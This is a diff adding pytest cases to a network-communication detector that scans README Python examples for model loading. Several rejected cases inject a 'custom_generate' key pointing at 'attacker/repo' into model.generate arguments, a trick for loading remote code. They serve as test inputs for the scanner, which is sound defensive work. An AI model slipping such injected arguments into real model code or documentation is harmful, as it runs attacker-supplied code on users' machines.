@@ -3295,6 +3295,145 @@ class TestNetworkCommDetector:
         assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
 
     @pytest.mark.parametrize(
+        "compound_statement",
+        [
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "if torch.cuda.is_available():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    model.generate(**inputs)\n"
+            ),
+        ],
+        ids=["no-grad", "conditional-device"],
+    )
+    def test_readme_python_example_allows_ordered_nested_mapping_binding(
+        self,
+        compound_statement: str,
+    ) -> None:
+        """A mapping bound earlier in the same single-execution body is canonical."""
+        data = (
+            "```python\nimport requests\nimport torch\nfrom PIL import Image\n"
+            "from transformers import AutoModel, AutoProcessor\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+            "processor = AutoProcessor.from_pretrained('official/model')\n"
+            "model = AutoModel.from_pretrained('official/model')\n"
+            f"{compound_statement}```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert findings
+        assert all(finding["severity"] == "INFO" for finding in findings)
+        assert not [finding for finding in findings if finding["type"] in {"network_library", "network_function"}]
+
+    @pytest.mark.parametrize(
+        "compound_statement",
+        [
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    alias = inputs\n"
+                "    alias |= {'custom_generate': 'attacker/repo'}\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    inputs = {'custom_generate': 'attacker/repo'}\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "with torch.no_grad():\n"
+                "    processor = model\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "for _ in range(1):\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    def deferred():\n"
+                "        model.generate(**inputs)\n"
+            ),
+            (
+                "if torch.cuda.is_available():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "else:\n"
+                "    model.generate(**inputs)\n"
+            ),
+            (
+                "outputs = [\n"
+                "    model.generate(**inputs)\n"
+                "    for inputs in [processor(images=image, return_tensors='pt')]\n"
+                "]\n"
+            ),
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "    for inputs in [{'custom_generate': 'attacker/repo'}]:\n"
+                "        model.generate(**inputs)\n"
+            ),
+            (
+                "if torch.cuda.is_available():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "model.generate(**inputs)\n"
+            ),
+            (
+                "for _ in range(1):\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "model.generate(**inputs)\n"
+            ),
+            ("def prepare():\n    inputs = processor(images=image, return_tensors='pt')\nmodel.generate(**inputs)\n"),
+            (
+                "with torch.no_grad():\n"
+                "    inputs = processor(images=image, return_tensors='pt')\n"
+                "model.generate(**inputs)\n"
+            ),
+        ],
+        ids=[
+            "same-compound-alias-mutation",
+            "same-compound-rebind",
+            "same-compound-factory-shadow",
+            "repeated-loop",
+            "deferred-function",
+            "sibling-branch",
+            "comprehension-target",
+            "loop-shadow",
+            "conditional-binding-before-top-level-call",
+            "loop-binding-before-top-level-call",
+            "deferred-binding-before-top-level-call",
+            "no-grad-binding-before-top-level-call",
+        ],
+    )
+    def test_readme_python_example_rejects_unsafe_nested_mapping_binding(
+        self,
+        compound_statement: str,
+    ) -> None:
+        data = (
+            "```python\nimport requests\nimport torch\nfrom PIL import Image\n"
+            "from transformers import AutoModel, AutoProcessor\n"
+            "image_url = 'https://huggingface.co/org/model/resolve/main/sample.png'\n"
+            "image = Image.open(requests.get(image_url, stream=True).raw)\n"
+            "processor = AutoProcessor.from_pretrained('official/model')\n"
+            "model = AutoModel.from_pretrained('official/model')\n"
+            f"{compound_statement}```\n"
+        ).encode()
+
+        findings = NetworkCommDetector().scan(data, "README.md")
+
+        assert any(finding["type"] == "network_library" for finding in findings)
+        assert any(finding["type"] == "network_function" for finding in findings)
+
+    @pytest.mark.parametrize(
         ("factory_name", "instance_name", "mapping_expression"),
         [
             ("AutoProcessor", "processor", "processor(images=image, return_tensors='pt')"),
